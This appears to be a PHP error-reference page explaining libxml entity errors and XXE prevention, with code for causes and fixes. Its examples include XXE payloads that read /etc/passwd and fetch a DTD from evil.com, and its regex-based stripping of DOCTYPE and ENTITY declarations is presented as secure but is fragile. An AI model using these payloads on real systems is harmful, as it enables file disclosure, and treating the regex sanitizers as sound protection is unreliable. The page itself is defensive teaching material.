---
title: "[Solution] PHP libxml Entity Error — Entity Reference Error"
description: "Fix PHP libxml entity error by disabling external entities, using libxml_disable_entity_loader(), and validating input. Copy-paste solutions with code examples."
languages: ["php"]
severities: ["error"]
error-types: ["runtime-error"]
weight: 15
---

# PHP libxml Entity Error — Entity Reference Error

An entity reference error occurred during XML processing. This happens when the XML document contains undefined entities, external entity references, or when entity loading is disabled for security reasons (XXE prevention).

## Common Causes

```php
// Cause 1: Undefined entity reference
$xml = '<root>&undefined_entity;</root>';
$doc = new DOMDocument();
$doc->loadXML($xml); // Entity not defined

// Cause 2: External entity reference (XXE)
$xml = '<?xml version="1.0"?>'
     . '<!DOCTYPE foo ['
     . '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
     . ']>'
     . '<root>&xxe;</root>';
$doc = new DOMDocument();
$doc->loadXML($xml); // External entity

// Cause 3: Entity loader disabled
libxml_disable_entity_loader(true);
$doc = new DOMDocument();
$doc->load('file.xml'); // Cannot load external entities

// Cause 4: Nested entity references
$xml = '<?xml version="1.0"?>'
     . '<!DOCTYPE foo ['
     . '<!ENTITY a "&b;">'
     . '<!ENTITY b "&c;">'
     . '<!ENTITY c "value">'
     . ']>'
     . '<root>&a;</root>';

// Cause 5: Parameter entity in internal subset
$xml = '<?xml version="1.0"?>'
     . '<!DOCTYPE foo ['
     . '<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">'
     . '%xxe;'
     . ']>'
     . '<root>text</root>';
```

## How to Fix

### Fix 1: Disable External Entities (XXE Prevention)

```php
// PHP < 8.0
if (function_exists('libxml_disable_entity_loader')) {
    libxml_disable_entity_loader(true);
}

// PHP >= 8.0: entity loading is disabled by default
```

### Fix 2: Use Internal Entity Handling

```php
function safeLoadXmlWithoutEntities(string $xml): ?DOMDocument {
    // Strip DOCTYPE to prevent entity declarations
    $xml = preg_replace('/<!DOCTYPE[^>]*>/i', '', $xml);

    libxml_use_internal_errors(true);
    $doc = new DOMDocument();

    if (!$doc->loadXML($xml)) {
        $errors = libxml_get_errors();
        libxml_clear_errors();
        libxml_use_internal_errors(false);

        foreach ($errors as $error) {
            error_log('Entity error: ' . trim($error->message));
        }
        return null;
    }

    libxml_use_internal_errors(false);
    return $doc;
}
```

### Fix 3: Validate and Sanitize XML Input

```php
function sanitizeXmlInput(string $xml): string {
    // Remove DOCTYPE declarations
    $xml = preg_replace('/<!DOCTYPE[^>]*>/i', '', $xml);

    // Remove entity declarations
    $xml = preg_replace('/<!ENTITY[^>]*>/i', '', $xml);

    // Remove processing instructions
    $xml = preg_replace('/<\?[^?]*\?>/s', '', $xml);

    return $xml;
}

function secureLoadXml(string $xml): ?DOMDocument {
    $xml = sanitizeXmlInput($xml);

    libxml_use_internal_errors(true);
    $doc = new DOMDocument();

    // Disable external entity loading
    if (function_exists('libxml_disable_entity_loader')) {
        $previousLoaderState = libxml_disable_entity_loader(true);
    }

    $result = $doc->loadXML($xml);

    if (function_exists('libxml_disable_entity_loader')) {
        libxml_disable_entity_loader($previousLoaderState);
    }

    if (!$result) {
        libxml_clear_errors();
        libxml_use_internal_errors(false);
        return null;
    }

    libxml_use_internal_errors(false);
    return $doc;
}
```

## Examples

```php
// Example: Secure XML parser for API requests
class SecureXmlParser {
    private bool $allowExternalEntities = false;

    public function __construct(bool $allowExternal = false) {
        $this->allowExternalEntities = $allowExternal;
    }

    public function parse(string $xml): ?DOMDocument {
        if (!$this->allowExternalEntities) {
            $xml = $this->stripDangerousContent($xml);
        }

        libxml_use_internal_errors(true);

        if (!$this->allowExternalEntities && function_exists('libxml_disable_entity_loader')) {
            libxml_disable_entity_loader(true);
        }

        $doc = new DOMDocument();
        $result = $doc->loadXML($xml);

        if (!$result) {
            $errors = libxml_get_errors();
            libxml_clear_errors();
            libxml_use_internal_errors(false);

            foreach ($errors as $error) {
                error_log("[SecureXmlParser] " . trim($error->message));
            }
            return null;
        }

        libxml_use_internal_errors(false);
        return $doc;
    }

    private function stripDangerousContent(string $xml): string {
        // Remove DOCTYPE
        $xml = preg_replace('/<!DOCTYPE[^>]*>/i', '', $xml);
        // Remove ENTITY declarations
        $xml = preg_replace('/<!ENTITY[^>]*>/i', '', $xml);
        // Remove external references
        $xml = preg_replace('/SYSTEM\s+["\'][^"\']*["\']/', '', $xml);
        return $xml;
    }
}

// Usage
$parser = new SecureXmlParser(allowExternal: false);
$doc = $parser->parse($userInput);
```

## Related Errors

- [libxml error](/languages/php/libxml-error/)
- [libxml parsing error](/languages/php/libxml-parse-error/)
- [libxml schema validation error](/languages/php/libxml-scheme-error/)
